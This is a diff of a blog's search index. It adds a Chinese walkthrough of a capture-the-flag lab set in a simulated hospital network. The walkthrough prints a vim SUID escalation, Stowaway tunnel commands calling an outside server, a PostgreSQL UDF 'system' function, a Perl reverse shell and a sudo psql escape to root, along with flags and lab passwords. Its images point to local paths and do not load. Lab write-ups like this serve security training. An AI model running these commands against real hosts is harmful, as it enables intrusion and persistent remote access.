@@ -98,7 +98,7 @@
 <figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><br><span class="hljs-attribute">creds_all</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://image.sp4rks.xyz/2025/05/image-20250502200227166.png" alt="image-20250502200227166"></p>
-<p>用BloodHound看一下当前环境，实测SharpHound用不了，上传一个ADExploere，具体可以看这篇文章<a href="https://mp.weixin.qq.com/s/yXkKf0AQkQiCXsaPgJBLmA%EF%BC%8C%E6%84%9F%E8%A7%89%E8%BF%98%E6%98%AF%E6%8C%BA%E5%A5%BD%E7%94%A8%E7%9A%84%EF%BC%8C%E5%BE%AE%E8%BD%AF%E5%AE%98%E6%96%B9%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%B2%A1%E6%9C%89%E8%A2%AB%E6%9D%80%E7%9A%84%E9%A3%8E%E9%99%A9%E3%80%82">https://mp.weixin.qq.com/s/yXkKf0AQkQiCXsaPgJBLmA，感觉还是挺好用的，微软官方的工具，没有被杀的风险。</a></p>
+<p>用BloodHound看一下当前环境，实测SharpHound用不了，上传一个ADExploere，具体可以看这篇 <a href="https://mp.weixin.qq.com/s/yXkKf0AQkQiCXsaPgJBLmA">文章</a>，感觉还是挺好用的，微软官方的工具，没有被杀的风险。</p>
 <p><img src="https://image.sp4rks.xyz/2025/05/image-20250503003821207.png" alt="image-20250503003821207"></p>
 <p>使用ADExploere生成域环境的完整快照</p>
 <p><img src="https://image.sp4rks.xyz/2025/05/image-20250503004229514.png" alt="image-20250503004229514"></p>
@@ -991,7 +991,6 @@
 <p><img src="https://image.sp4rks.xyz/2025/05/image-20250508191054373.png" alt="image-20250508191054373"></p>
 <h1 id="对主站的渗透尝试"><a href="#对主站的渗透尝试" class="headerlink" title="对主站的渗透尝试"></a>对主站的渗透尝试</h1><p>同样存在任意文件下载漏洞，但主站没有开放 3306，拿到账号密码也登陆不了。</p>
 <p><img src="https://image.sp4rks.xyz/2025/05/image-20250513194626056.png" alt="image-20250513194626056"></p>
-<p><img src="https://image.sp4rks.xyz/2025/05/image-20250511002832220.png" alt="image-20250511002832220"></p>
 <p>只能从后台方面入手，后台路径还是和旁站的一样</p>
 <p>这里有个坑，假如使用https:&#x2F;&#x2F;访问(浏览器默认https)，就算你账号密码是对的，也登陆不进去，显示非法访问。 (根据这个站的特性，我最开始是以为密码错了就提示这个，最后发现不是)</p>
 <p><img src="https://image.sp4rks.xyz/2025/05/image-20250508192348510.png" alt="image-20250508192348510"></p>
@@ -3620,6 +3619,153 @@
       </categories>
       <tags>
         <tag>JAVA内存马</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>春秋云镜-Initial</title>
+    <url>/2025/05/19/%E5%A4%A7%E5%B8%88%E4%B9%8B%E8%B7%AF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。</p>
+<table>
+<thead>
+<tr>
+<th align="left">网段</th>
+<th align="left">IP地址</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">互联网侧</td>
+<td align="left">39.99.227.180</td>
+<td align="left">heapdump文件泄露+shiro反序列化</td>
+</tr>
+<tr>
+<td align="left">172.30.12.0&#x2F;24</td>
+<td align="left">172.30.12.5</td>
+<td align="left">入口机</td>
+</tr>
+<tr>
+<td align="left">172.30.12.0&#x2F;24</td>
+<td align="left">172.30.12.6</td>
+<td align="left">Nacos yaml反序列化</td>
+</tr>
+<tr>
+<td align="left">双网卡主机</td>
+<td align="left">172.30.12.236</td>
+<td align="left">Fastjson反序列化</td>
+</tr>
+<tr>
+<td align="left">172.30.54.0&#x2F;24</td>
+<td align="left">172.30.54.179</td>
+<td align="left">Grafana任意文件读取</td>
+</tr>
+</tbody></table>
+<p><img src="https://image.sp4rks.xyz/2025/05/image-20250520131428386.png" alt="image-20250520131428386"></p>
+<p>稍微对这个图解释一下方便理解：1. 先获取互联网可达的目标主机(39.99.227.180)的shell；2. 在公网服务器(39.107.82.184)和主机1之间建立Stowaway隧道；3. 通过主机1的6666端口代理访问DMZ区域的其他主机；4. 主机3通过隧道连接回主机1，建立第二级代理节点；5.通过主机3的代理(7777端口)访问内网区域的主机；6. 最终实现从攻击者主机到内网资源的双重代理访问。</p>
+<h1 id="39-99-227-180"><a href="#39-99-227-180" class="headerlink" title="39.99.227.180"></a>39.99.227.180</h1><p>一眼shiro</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172226581.png" alt="image-20250519172226581"></p>
+<p>尝试用工具破解链子不行，然后想起fscan中有heapdump</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519152140753.png" alt="image-20250519152140753"></p>
+<p>直接打个内存马连接上就行</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172440279.png" alt="image-20250519172440279"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172659360.png" alt="image-20250519172659360"></p>
+<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -perm <span class="hljs-number">-4000</span> -type f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519172912603.png" alt="image-20250519172912603"></p>
+<figure class="highlight pf"><table><tr><td class="code"><pre><code class="hljs pf">/usr/bin/vim.<span class="hljs-keyword">basic</span>  -c &#x27;:python3 import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.execl(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-pc&quot;</span>, <span class="hljs-string">&quot;reset; exec bash -p&quot;</span>)&#x27; &amp;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fg</span> %<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173110318.png" alt="image-20250519173110318"></p>
+<figure class="highlight maxima"><table><tr><td class="code"><pre><code class="hljs maxima">flag01: flag&#123;8016408b-8efd-<span class="hljs-number">48b7</span>-b6e5-dc1b50dcdfa4&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ctrl</span> +d 回到pwncat<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173314082.png" alt="image-20250519173314082"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173520789.png" alt="image-20250519173520789"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./linux_x64_admin -l 1234 -s 123<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">./linux_x64_agent <span class="hljs-punctuation">-</span>c <span class="hljs-number">39.107</span>.<span class="hljs-number">82.184</span><span class="hljs-punctuation">:</span><span class="hljs-number">1234</span> <span class="hljs-punctuation">-</span>s <span class="hljs-number">123</span> <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519173846942.png" alt="image-20250519173846942"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519174101449.png" alt="image-20250519174101449"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519155927950.png" alt="image-20250519155927950"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519160134984.png" alt="image-20250519160134984"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519160407659.png" alt="image-20250519160407659"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519155904826.png" alt="image-20250519155904826"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519161615536.png" alt="image-20250519161615536"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519191622521.png" alt="image-20250519191622521"></p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: flag&#123;ee5dac3e-<span class="hljs-number">4</span>eac-<span class="hljs-number">4</span>d9a-<span class="hljs-number">8</span>bff-d3f712b6b959&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519162521190.png" alt="image-20250519162521190"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519162503819.png" alt="image-20250519162503819"></p>
+<p>可以用通杀的payload打，打了半天没成功，想起是不出网的，可以把JNDI攻击放在01，我这里太麻烦了，就直接用插件了</p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519163112103.png" alt="image-20250519163112103"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180105696.png" alt="image-20250519180105696"></p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;a87370ce-cd37-<span class="hljs-number">4</span>f5b-bc30-<span class="hljs-number">1</span>b9e805582c1&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180256298.png" alt="image-20250519180256298"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180630775.png" alt="image-20250519180630775"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519180859852.png" alt="image-20250519180859852"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181025033.png" alt="image-20250519181025033"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181100412.png" alt="image-20250519181100412"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181430467.png" alt="image-20250519181430467"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519181748570.png" alt="image-20250519181748570"></p>
+<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">postgres:</span>Postgres<span class="hljs-subst">@123</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183236907.png" alt="image-20250519183236907"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183259067.png" alt="image-20250519183259067"></p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR REPLACE</span> <span class="hljs-keyword">FUNCTION</span> <span class="hljs-keyword">system</span> (<span class="hljs-type">cstring</span>) <span class="hljs-keyword">RETURNS</span> <span class="hljs-type">integer</span> <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span> <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">STRICT</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519183425606.png" alt="image-20250519183425606"></p>
+<figure class="highlight tcl"><table><tr><td class="code"><pre><code class="hljs tcl">select system(&#x27;perl -e \&#x27;use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;172.30.54.179&quot;</span>;<span class="hljs-variable">$p</span>=<span class="hljs-number">1234</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;\&#x27;&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519185951105.png" alt="image-20250519185951105"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519185938421.png" alt="image-20250519185938421"></p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519190059566.png" alt="image-20250519190059566"></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">postgres<span class="hljs-variable">@web04</span><span class="hljs-symbol">:/usr/local/pgsql/data</span><span class="hljs-variable">$ </span>sudo /usr/local/postgresql/bin/psql<br>sudo /usr/local/postgresql/bin/psql<br><span class="hljs-title class_">Password</span>: <span class="hljs-number">123456</span><br><br><span class="hljs-title class_">Welcome</span> to psql <span class="hljs-number">8.1</span>.<span class="hljs-number">0</span>, the <span class="hljs-title class_">Postgre</span>SQL interactive terminal.<br><br><span class="hljs-title class_">Type</span>:  \copyright <span class="hljs-keyword">for</span> distribution terms<br>       \h <span class="hljs-keyword">for</span> help with <span class="hljs-variable constant_">SQL</span> commands<br>       \? <span class="hljs-keyword">for</span> help with psql commands<br>       \g <span class="hljs-keyword">or</span> terminate with semicolon to execute query<br>       \q to quit<br><br>root=<span class="hljs-comment"># \?</span><br><span class="hljs-title class_">Input</span>/<span class="hljs-title class_">Output</span><br>--<span class="hljs-title class_">More</span>--!<span class="hljs-regexp">/bin/bash</span><br>root<span class="hljs-variable">@web04</span><span class="hljs-symbol">:/usr/local/pgsql/data</span><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250519190623217.png" alt="image-20250519190623217"></p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag04</span>: flag&#123;a90adb0f-<span class="hljs-number">7</span>d19-<span class="hljs-number">4</span>f9f-be3d-<span class="hljs-number">0</span>a8207ec0dc0&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><a href="https://5ime.cn/yunjing-hospital.html">https://5ime.cn/yunjing-hospital.html</a></p>
+<p><a href="https://5ime.cn/msa-intranet-penetration.html#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-1">https://5ime.cn/msa-intranet-penetration.html#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-1</a></p>
+<p><a href="https://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/">https://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/</a></p>
+<p><a href="https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/">https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/</a></p>
+<p><a href="https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA">https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA</a></p>
+]]></content>
+      <categories>
+        <category>内网安全</category>
+      </categories>
+      <tags>
+        <tag>春秋云镜</tag>
       </tags>
   </entry>
 </search>
